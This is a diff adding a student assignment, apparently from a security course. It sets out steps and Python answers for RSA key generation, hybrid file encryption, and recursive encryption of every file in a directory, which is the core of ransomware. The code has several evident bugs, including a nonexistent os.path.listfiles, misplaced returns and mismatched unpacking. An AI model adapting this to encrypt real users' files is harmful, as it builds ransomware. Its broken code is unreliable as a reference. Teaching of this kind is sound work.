@@ -1,0 +1,197 @@
+Step 1:
+
+Next, you will a script that looks for a pair of RSA Public and private key (using a CONSTANT file path; PEM format). If the files do not exist (use OS package) then generate the RSA public and private key (2048 bits length) using the same constant file path.
+
+import sys, os , json
+sys.path.append('/Users/Justin/Desktop/cecs378Pyfiles')
+import CONSTANTS
+import base64
+import FUNCTIONS
+import cryptography
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import padding, serialization, hashes, asymmetric
+from cryptography.hazmat.primitives.asymmetric import rsa
+from cryptography.hazmat.primitives import hashes, hmac
+
+
+#check for Pem Key Pair
+def checkPemKeyPair():
+    #check all files in directory for the key pair
+    try:
+        #for root, dirs, files in os.walk(CONSTANTS.directory):
+        for file in os.path.listfiles(CONSTANTS.directory):
+            if file.endswith(".pem"):
+                if file == "PublicKEY.pem":
+                    publicKeyPath = os.path.abspath(os.path.join( file))
+                if file == "PrivateKEY.pem":
+                    privateKeyPath = os.path.abspath(os.path.join(file))
+                return publicKeyPath, privateKeyPath
+    except:
+        #generate key
+        backend = default_backend()
+        key = rsa.generate_private_key(backend=backend, public_exponent=65537,key_size=2048)
+
+        #private key
+        private_key = key.private_bytes(
+        encoding=serialization.Encoding.PEM,
+        format=serialization.PrivateFormat.TraditionalOpenSSL,
+        encryption_algorithm=serialization.NoEncryption())
+
+        #public key
+        public_key = key.public_key().public_bytes(
+        encoding=serialization.Encoding.PEM,
+        format=serialization.PublicFormat.SubjectPublicKeyInfo)
+
+        with open(CONSTANTS.directory + '/PrivateKEY.pem', 'wb') as privateKey:
+            privateKey.write(private_key)
+            privateKey.close()
+
+        with open(CONSTANTS.directory + '/PublicKEY.pem', 'wb') as publicKey:
+            publicKey.write(public_key)
+            publicKey.close()
+        return CONSTANTS.directory + '/PublicKEY.pem', CONSTANTS.directory + '/PrivateKEY.pem'
+
+    
+________________________________________________________________________
+________________________________________________________________________
+
+
+Step 2:
+
+You are asked to write a method as below:
+(RSACipher, C, IV, tag, ext)= MyRSAEncrypt(filepath, RSA_Publickey_filepath):
+In this method, you first call MyfileEncryptMAC (filepath) which will return (C, IV, tag, Enckey, HMACKey, ext). You then will initialize an RSA public key encryption object and load pem publickey from the RSA_publickey_filepath. Lastly, you encrypt the key variable ("key"= EncKey+ HMACKey (concatenated)) using the RSA publickey in OAEP padding mode. The result will be RSACipher. You then return (RSACipher, C, IV, ext). Remember to do the inverse (MyRSADecrypt (RSACipher, C, IV, tag, ext, RSA_Privatekey_filepath)) which does the exactly inverse of the above and generate the decrypted file using your previous decryption methods.
+
+def MyRSAEncryptMAC( filePath, RSA_publicKeyfilepath):
+    try:
+        #ciphertext, IV, tag, Enckey, ext, filePath
+        encryption = MyfileEncryptMAC(filePath)
+        ciphertext=encryption[0]
+        IV=encryption[1]
+        tag = encryption[2]
+        Enckey=encryption[3]
+        ext=encryption[4]
+        filePath=encryption[5]
+    except:
+        print("Error: Check the file path!")
+        return
+
+    try:
+        with open(RSA_publicKeyfilepath, "rb") as key_file:
+            public_key = serialization.load_pem_public_key(
+            key_file.read(),
+            backend=default_backend())
+            key_file.close()
+    except:
+            print("Error: PEM public key does not exist or check the file path of your PEM public key.")
+            return
+
+    try:
+        #RSA encryption with secure padding and hash
+        RSACipher = public_key.encrypt(
+        Enckey,
+        asymmetric.padding.OAEP(mgf=asymmetric.padding.MGF1(algorithm=hashes.SHA256()),
+        algorithm=hashes.SHA256(),label=None))
+
+    except:
+        print("Error with RSA Encryption. ")
+        return
+return RSACipher, ciphertext, IV, ext, filePath
+    
+    
+def MyRSADecryptMAC(RSACipher,privateKeyFilePath, ciphertext, IV, ext,encryptedFilePath):
+    try:
+        with open( privateKeyFilePath, "rb") as key_file:
+            privateKey = serialization.load_pem_private_key(key_file.read(),password = None, backend=default_backend())
+            key_file.close()
+
+    except:
+        print("Error:Check private key file path")
+        return
+
+    try:
+        privateKey = privateKey.decrypt(
+        RSACipher,
+        asymmetric.padding.OAEP(mgf=asymmetric.padding.MGF1(algorithm=hashes.SHA256()),
+        algorithm=hashes.SHA256(),label=None))
+    except:
+        print("Error:Could not decrypt the private key")
+        return
+
+    try:
+        #decrypt ciphertext using the privateKey
+        MyfileDecryptMAC( encryptedFilePath, ciphertext, IV,privateKey, ext)
+    except:
+        print("Error: RSA decryption failed.\n")
+        return
+________________________________________________________________________
+________________________________________________________________________
+Step 3:
+
+You can use the OS package to retrieve the current working directory. Then you can get a list of all files in this directory. For each file, encrypt them using MyRSAEncrypt from your new FileEncryptMAC module. Do this in a loop for all files (make sure you do not encrypt the RSA Private Key file). For every file that is encrypted, store the encrypted file as a JSON file. The attributes you have for each file are 'RSACipher', 'C', 'IV', 'tag' and 'ext'. The values are from MyRSAEncrypt method. Once the JSON fire is written (use json.dump() with file.write() methods) into a JSON file then you can remove the plaintext file (use os.remove() method). Note that you need to encode/decode your data before writing them into a JSON file.
+Make sure then you can traverse thru all files within all sub-directories of a current working directory.  Encrypt all such files (either recursive execution or os.walk as an example).
+Note: DO NOT test your script on any valuable file. It will be your responsibility if you lose any important data to you.
+
+
+def DirectoryEncrypt(directory):
+    try:
+       Key = FUNCTIONS.checkPemKeyPair()
+    except:
+        print("Error: Issue with PEM Key Pair")
+        return
+    
+    try:
+        for root, dirs, files in os.walk(directory):
+               for file in files:
+                   try:
+                       RSACipher, C, IV, tag, ext = FUNCTIONS.MyRSAEncryptMAC(os.path.join(root,file),Key[0])
+                   except:
+                       print("Error: MyRSAEncryptMAC failed.")
+                   return
+                   # create JSON file 
+                   try:
+                   #https://stackabuse.com/reading-and-writing-json-to-a-file-in-python/
+                       data = {'encrypted': [{'RSACipher':RSACipher,'C':C,'IV':IV,'tag':tag,'ext':ext}]}
+                   except:
+                       print("Error: Could not create JSON file.")
+                   return
+            
+                   try:
+                       encryptedFilepath = os.path.splitext(file)[0] + ".encrypted" + ".json"
+                       with open(encryptedFilepath, 'w') as jsonFile:
+                           json.dump(data,jsonFile, indent=4)
+                    
+                   except:
+                       print("Error: Could not create JSON file.")
+                   return
+            
+               for file in dirs:    
+                   try:
+                       RSACipher, C, IV, tag, ext = FUNCTIONS.MyRSAEncryptMAC(os.path.join(root,file),Key[0])
+                   except:
+                       print("Error: MyRSAEncryptMAC failed.")
+                   return
+                   # create JSON file 
+                   try:
+                   #https://stackabuse.com/reading-and-writing-json-to-a-file-in-python/
+                       data = {'encrypted': [{'RSACipher':RSACipher,'C':C,'IV':IV,'tag':tag,'ext':ext}]}
+                   except:
+                       print("Error: Could not create JSON file.")
+                   return
+            
+                   try:
+                       encryptedFilepath = os.path.splitext(file)[0] + ".encrypted" + ".json"
+                       with open(encryptedFilepath, 'w') as jsonFile:
+                           json.dump(data,jsonFile, indent=4)
+                   except:
+                        print("Error: Could not create JSON file.")
+                        return
+    except:
+        print("Directory does not exist or something is wrong.")
+        return
+    
+            
+            
+               
+            
